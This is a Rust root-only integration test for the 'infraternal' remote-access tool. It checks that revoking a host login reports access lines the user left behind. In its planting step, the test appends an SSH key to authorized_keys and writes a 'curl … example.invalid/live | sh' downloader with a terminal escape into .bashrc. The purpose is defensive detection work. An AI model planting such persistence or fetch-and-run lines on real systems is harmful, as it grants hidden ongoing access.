//! D356 delivered end to end on a real root host (#355): a live server with
//! its HTTPS listener, a real `infraternal agent` joined as root, a real
//! host login for a person on a real account, and the real CLI. The person
//! plants access lines through their own shell; removing the host revokes
//! the login, the agent reports the lines, the server keeps them, and
//! `remove-host --access-report` prints them.
//!
//! Run only as root, through a root clone of the commit under review (see the
//! job's script on #355): it creates real host logins and stops them.
use super::*;

/// The existing host account the person's login runs as.
const ACCOUNT: &str = "INFRATERNAL_ACCESS_REPORT_ACCOUNT";

/// Run the real CLI's `remove-host` against the live server with the
/// session (and review) on private stdin. Returns its exit success and output.
async fn remove_host(
    binary: &Path,
    origin: &str,
    trust: &Path,
    host: uuid::Uuid,
    input: &serde_json::Value,
    arguments: &[&str],
) -> (bool, String) {
    use tokio::io::AsyncWriteExt;
    let host = host.to_string();
    let mut command = tokio::process::Command::new(binary);
    command
        .args(["remove-host", host.as_str(), "--server", origin])
        .args(arguments)
        // The fixture's CA is trusted through OpenSSL's default path only.
        .env("SSL_CERT_FILE", trust)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .kill_on_drop(true);
    let mut child = command.spawn().unwrap();
    child
        .stdin
        .take()
        .unwrap()
        .write_all(&serde_json::to_vec(input).unwrap())
        .await
        .unwrap();
    let output = tokio::time::timeout(Duration::from_secs(60), child.wait_with_output())
        .await
        .unwrap()
        .unwrap();
    (
        output.status.success(),
        String::from_utf8_lossy(&output.stdout).into_owned(),
    )
}

/// The JSON record a `--json` CLI run printed.
fn record(output: &str) -> serde_json::Value {
    serde_json::from_str(output.trim()).unwrap_or_else(|_| panic!("not one JSON record: {output}"))
}

/// See the module doc. Prints the CLI's output for the issue.
#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
#[ignore = "real root only: run through a root clone of the commit under review (#355)"]
async fn access_report_reaches_remove_host_through_a_live_server() {
    assert_eq!(
        nix::unistd::Uid::effective().as_raw(),
        0,
        "real root required"
    );
    let binary = PathBuf::from(
        std::env::var_os("INFRATERNAL_REMOTE_TEST_BINARY").expect("real CLI binary required"),
    );
    let account = std::env::var(ACCOUNT).expect("set the host account for the login");
    let user = nix::unistd::User::from_name(&account)
        .unwrap()
        .expect("the host account exists");
    let directory = Directory::new();
    let address: SocketAddr = "127.0.0.1:4711".parse().unwrap();
    let fixture = fixture_at(&directory, address, "127.0.0.1:0".parse().unwrap()).await;
    // A passkey-shaped owner whose OS username is the test account, so the
    // terminal is a real host login for this person on that account.
    let owner = uuid::Uuid::new_v4();
    sqlx::query("UPDATE users SET owner=0 WHERE id='owner'")
        .execute(&fixture.pool)
        .await
        .unwrap();
    sqlx::query("INSERT INTO users(id,name,owner,recovery_hash,username,display_name) VALUES (?,'owner',1,'unused',?,'Owner')")
        .bind(owner.to_string())
        .bind(&account)
        .execute(&fixture.pool)
        .await
        .unwrap();
    sqlx::query("UPDATE sessions SET user_id=? WHERE token_hash=?")
        .bind(owner.to_string())
        .bind(crate::auth::hash(&fixture.cookie))
        .execute(&fixture.pool)
        .await
        .unwrap();
    let origin = format!("https://localhost:{}", address.port());
    let host = uuid::Uuid::new_v4();
    let marker = directory.0.join(".bootstrap-owner");
    std::fs::write(&marker, format!("{}\n", host.simple())).unwrap();
    std::fs::set_permissions(&marker, std::fs::Permissions::from_mode(0o600)).unwrap();
    let digest = prepare_pending_join_key(&directory.0.join("data"));
    let invitation = invitation_with_mode(
        address,
        &fixture.root,
        &origin,
        &fixture.cookie,
        host,
        ("rootful", 0),
        digest,
    )
    .await;
    let started = Instant::now();
    let mut child = cli(&binary, &directory, true, &origin);
    // Join reads the invitation to its end: write it and close stdin.
    child
        .0
        .stdin
        .take()
        .unwrap()
        .write_all(&invitation)
        .unwrap();
    drop(invitation);

    // The person's first login on the account: the agent records the
    // fingerprint of its access files (the grant).
    let mut browser = browser(address, &fixture.root, &origin, &fixture.cookie).await;
    let session = try_open_remote_with_budget(&mut browser, host, started, Duration::from_secs(60))
        .await
        .expect("the rootful host did not register");
    send(
        &mut browser,
        1,
        &Frame::AttachTerm {
            session_id: session.as_bytes(),
            last_out_seq: 0,
            last_in_seq: 0,
        },
    )
    .await;
    send(&mut browser, 1, &Frame::Credit { bytes: 1024 * 1024 }).await;
    let mut output = Vec::new();
    let mut cursor = 0;
    first_terminal_output(&mut browser, &mut output, &mut cursor).await;
    // Through the person's own shell: say who it runs as, then plant one new
    // key and one startup line carrying a terminal escape.
    let planting = b"printf 'WHO_%s_END\\n' \"$(id -un)\"; mkdir -p ~/.ssh && printf 'ssh-ed25519 AAAAlive live-left-behind\\n' >> ~/.ssh/authorized_keys && printf 'curl -s http://example.invalid/live | sh \\033[2J\\n' >> ~/.bashrc && printf 'PLANTED_%s\\n' DONE\n";
    send(
        &mut browser,
        1,
        &Frame::Input {
            in_seq: 0,
            bytes: planting,
        },
    )
    .await;
    until(&mut browser, &mut output, &mut cursor, b"PLANTED_DONE").await;
    let shown = String::from_utf8_lossy(&output);
    assert!(
        shown.contains(&format!("WHO_{account}_END")),
        "the shell does not run as {account}: {shown}"
    );
    drop(browser);

    // Remove the host with the real CLI (dry run, then the removal, keeping
    // the agent installed), then read the report the host returns.
    let trust = directory.0.join("fixture-root.pem");
    std::fs::write(&trust, fixture.root.to_pem().unwrap()).unwrap();
    let session = serde_json::json!({"session": format!("__Host-infraternal={}", fixture.cookie)});
    let (ok, dry) = remove_host(&binary, &origin, &trust, host, &session, &["--json"]).await;
    assert!(ok, "dry run refused: {dry}");
    let review = record(&dry)["data"]["review"].as_str().unwrap().to_owned();
    let mut finish_input = session.clone();
    finish_input["review"] = review.into();
    let (ok, finished) = remove_host(
        &binary,
        &origin,
        &trust,
        host,
        &finish_input,
        &["--finish", "--retain", "--json"],
    )
    .await;
    assert!(ok, "removal refused: {finished}");
    println!("REMOVE_HOST_FINISH {}", finished.trim());
    let removed = Instant::now();
    let report = loop {
        let (ok, read) = remove_host(
            &binary,
            &origin,
            &trust,
            host,
            &session,
            &["--access-report", "--json"],
        )
        .await;
        assert!(ok, "report read refused: {read}");
        let read = record(&read);
        if read["data"]["state"] == "ready" {
            break read;
        }
        assert!(
            removed.elapsed() < Duration::from_secs(180),
            "no report 180 s after the removal: {read}"
        );
        // sleep: the host confirms on its own reconnect; poll the read-only route.
        tokio::time::sleep(Duration::from_secs(2)).await;
    };
    println!(
        "ACCESS_REPORT_READY after_removal_ms={} {}",
        removed.elapsed().as_millis(),
        report["data"]
    );
    let (ok, human) = remove_host(
        &binary,
        &origin,
        &trust,
        host,
        &session,
        &["--access-report"],
    )
    .await;
    assert!(ok);
    println!("REMOVE_HOST_ACCESS_REPORT_HUMAN\n{human}");
    assert!(human.contains("~/.ssh/authorized_keys"), "{human}");
    assert!(
        human.contains("  + ssh-ed25519 AAAAlive live-left-behind"),
        "{human}"
    );
    assert!(human.contains("~/.bashrc"), "{human}");
    assert!(
        human.contains("  + curl -s http://example.invalid/live | sh \u{fffd}[2J"),
        "{human}"
    );
    assert!(
        !human.contains('\u{1b}'),
        "a terminal escape reached the owner"
    );
    // The files were reported, never edited.
    let keys = std::fs::read_to_string(user.dir.join(".ssh/authorized_keys")).unwrap();
    assert!(keys.contains("ssh-ed25519 AAAAlive live-left-behind"));
    let startup = std::fs::read(user.dir.join(".bashrc")).unwrap();
    assert!(startup.windows(4).any(|window| window == b"\x1b[2J"));
    println!("ACCESS_FILES_UNTOUCHED authorized_keys=kept bashrc=kept");
    drop(child);
    drop(fixture);
    drop(directory);
}
